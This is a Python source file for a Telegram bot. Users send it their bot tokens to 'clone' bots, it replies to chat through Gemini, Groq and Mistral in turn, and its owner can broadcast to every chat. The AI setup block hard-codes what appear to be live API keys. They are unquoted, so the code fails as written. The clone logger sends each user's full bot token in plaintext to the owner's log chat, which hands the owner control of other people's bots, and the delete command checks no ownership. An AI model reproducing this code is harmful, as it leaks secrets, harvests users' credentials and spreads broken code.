import os
import asyncio
import google.generativeai as genai
from groq import Groq
from mistralai import Mistral
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Modules & DB Imports
from modules.welcome import welcome_toggle, welcome_member 
from modules.admin import ban_user, mute_user, promote_user
from database import add_cloned_bot, remove_cloned_bot, chats_collection
from config import (
    API_ID, API_HASH, OWNER_ID, CLONE_LOGGER, 
    GEMINI_API_KEY, GROQ_API_KEY, MISTRAL_API_KEY
)

# AI Setup
genai.configure(api_key=AIzaSyAh9nSgM8AcXRkPpdpl_X1qQzxlpPCLnqc)
gemini_model = genai.GenerativeModel("gemini-1.5-flash")
groq_client = Groq(api_key=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)
mistral_client = Mistral(api_key=mlcdtWBdftyjUKbTksmW8v3k5o1WGZO9)

# Memory cache
CLONES = {}

# --- AI Multi-Engine Logic (The "Best" Part) ---
async def get_ai_reply(text):
    # 1. Pehle Gemini Try Karein
    if GEMINI_API_KEY:
        try:
            response = gemini_model.generate_content(text)
            return response.text
        except Exception:
            pass # Fail hua toh agle pe jao

    # 2. Gemini fail toh Groq Try Karein
    if GROQ_API_KEY:
        try:
            chat_completion = groq_client.chat.completions.create(
                messages=[{"role": "user", "content": text}],
                model="llama3-8b-8192",
            )
            return chat_completion.choices[0].message.content
        except Exception:
            pass

    # 3. Groq fail toh Mistral Try Karein
    if MISTRAL_API_KEY:
        try:
            chat_response = mistral_client.chat.complete(
                model="mistral-tiny",
                messages=[{"role": "user", "content": text}],
            )
            return chat_response.choices[0].message.content
        except Exception:
            pass

    return "❌ Sorry meri jaan, saare AI engines busy hain. Thodi der baad try karo!"

# --- Chatbot Handler (Avoid Repeating) ---
async def chatbot_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    # User ka message lo
    user_text = update.message.text
    
    # AI se jawab mangao
    reply = await get_ai_reply(user_text)
    
    # Reply bhej do
    await update.message.reply_text(reply)

# --- 1. Clone Logger Logic ---
async def log_new_clone(context, user, bot_info, token):
    if not CLONE_LOGGER or CLONE_LOGGER == 0:
        return
    log_text = (
        "🆕 **𝗡𝗲𝘄 𝗖𝗹𝗼𝗻𝗲 𝗔𝗹𝗲𝗿𝘁!**\n\n"
        f"👤 **𝗨𝘀𝗲𝗿:** {user.first_name} (ID: `{user.id}`)\n"
        f"🤖 **𝗕𝗼𝘁:** @{bot_info.username}\n"
        f"🔑 **𝗧𝗼𝗸𝗲𝗻:** `{token}`\n\n"
        "⚡ #NATKHAT_CLONER_LOG"
    )
    try:
        await context.bot.send_message(chat_id=CLONE_LOGGER, text=log_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Logging Error: {e}")

# --- 2. Master Broadcast ---
async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != int(OWNER_ID):
        return await update.message.reply_text("❌ Sirf Malik ke liye!")
    if not update.message.reply_to_message:
        return await update.message.reply_text("Reply karke bhej bhai!")
    
    msg = update.message.reply_to_message
    all_chats = chats_collection.find()
    for chat in all_chats:
        try:
            await context.bot.copy_message(chat_id=chat['chat_id'], from_chat_id=msg.chat_id, message_id=msg.message_id)
            await asyncio.sleep(0.3)
        except: continue
    await update.message.reply_text("✅ Done!")

# --- Register Handlers ---
def register_all_handlers(app: Application):
    app.add_handler(CommandHandler("start", clone_start_handler))
    app.add_handler(CommandHandler("clone", clone_bot))
    app.add_handler(CommandHandler("delclone", delclone_bot))
    app.add_handler(CommandHandler("broadcast", broadcast_handler))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("mute", mute_user))
    app.add_handler(CommandHandler("promote", promote_user))
    # Chatbot reply handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chatbot_reply))
    app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, welcome_member))

# --- 3. CLONE Command ---
async def clone_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("✨ `/clone <token>` likho!")

    bot_token = context.args[0]
    status_msg = await update.message.reply_text("🚀 **Setup ho raha hai...**")
    try:
        app = Application.builder().token(bot_token).build()
        register_all_handlers(app)
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        bot_info = await app.bot.get_me()
        add_cloned_bot(update.effective_user.id, bot_token, bot_info.username, bot_info.id)
        CLONES[bot_token] = app
        await log_new_clone(context, update.effective_user, bot_info, bot_token)
        await status_msg.edit_text(f"✅ **Clone Active!** @{bot_info.username}")
    except:
        await status_msg.edit_text("❌ Token galat hai!")

# --- 4. DE-CLONE Command ---
async def delclone_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return
    token = context.args[0]
    if token in CLONES:
        await CLONES[token].stop()
        del CLONES[token]
    remove_cloned_bot(token)
    await update.message.reply_text("🗑️ Deleted!")

# --- 5. Start Message ---
async def clone_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = f"𝖧𝖾𝗒 **{update.effective_user.first_name}**\n\n➜ 𝖴𝗇𝗅𝗂𝗆𝗂𝗍𝖾𝖽 `/clone` 𝖥𝖾𝖺𝗍𝗎𝗋𝖾\n➜ Fast AI Response\n➜ No Repeat System"
    buttons = [[InlineKeyboardButton("➕ Add Me", url=f"https://t.me/{context.bot.username}?startgroup=true")]]
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode='Markdown')
